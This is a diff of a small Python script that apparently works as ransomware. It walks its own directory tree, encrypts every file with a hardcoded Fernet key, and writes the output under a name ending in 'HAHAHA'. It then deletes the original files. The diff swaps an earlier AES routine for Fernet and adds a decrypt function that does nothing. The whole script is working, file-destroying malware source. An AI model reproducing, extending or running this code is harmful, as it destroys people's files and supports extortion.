@@ -1,21 +1,20 @@
 import os
 import base64
 import sys
-from io import BytesIO
-from Crypto import Random
-from Crypto.Cipher import AES
+from cryptography.fernet import Fernet
 
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
+KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='
 
 def encrypt(data, filename):
-    with open(filename, "rb") as source:
-        key = source.read(24)
+	f = Fernet(KEY)
 
-    iv = Random.new().read(AES.block_size)
-    cipher = AES.new(key, AES.MODE_CFB, iv)
-    encrypted = iv + cipher.encrypt(data)
+	encrypted_data = f.encrypt(data)
 
-    return base64.b64encode(encrypted)
+	return encrypted_data
+
+def decrypt(data):
+	pass
 
 if __name__ == "__main__":
 	for (dirpath, dirnames, filenames) in os.walk(THIS_DIR):
@@ -29,5 +28,4 @@ if __name__ == "__main__":
 			destination = file + "HAHAHA"
 			with open(destination, "wb") as fd:
 				fd.write(encrypt(data, file))
-				fd.close()
 			os.remove(file)
